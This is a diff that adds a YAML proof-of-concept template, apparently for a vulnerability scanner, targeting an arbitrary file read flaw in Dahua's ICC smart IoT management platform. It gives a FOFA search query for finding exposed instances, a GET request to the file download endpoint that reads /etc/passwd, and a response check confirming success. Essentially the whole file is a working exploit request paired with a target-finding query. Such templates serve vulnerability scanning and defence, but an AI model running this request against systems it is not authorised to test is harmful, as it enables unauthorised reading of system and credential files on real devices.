@@ -1,0 +1,24 @@
+id: poc-yaml-dahua-icc-file-download-anyfile-read
+info:
+  name: 大华ICC智能物联综合管理平台 file_download 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 大华ICC智能物联综合管理平台
+  fofa: body="static/qwebchannel.js" && body="/*客户端会小于800*/"
+requests:
+- method: GET
+  path: /evo-apigw/evo-cirs/file/download?filePath=file:///etc/passwd
+  expression: 'status_code == 200 &&
+
+    contains(body,"root:") &&
+
+    contains(body,"/bin") &&
+
+    !contains(body,"<") &&
+
+    contains(headers,"/evo-apigw")
+
+    '
+variables: {}
+transport: http
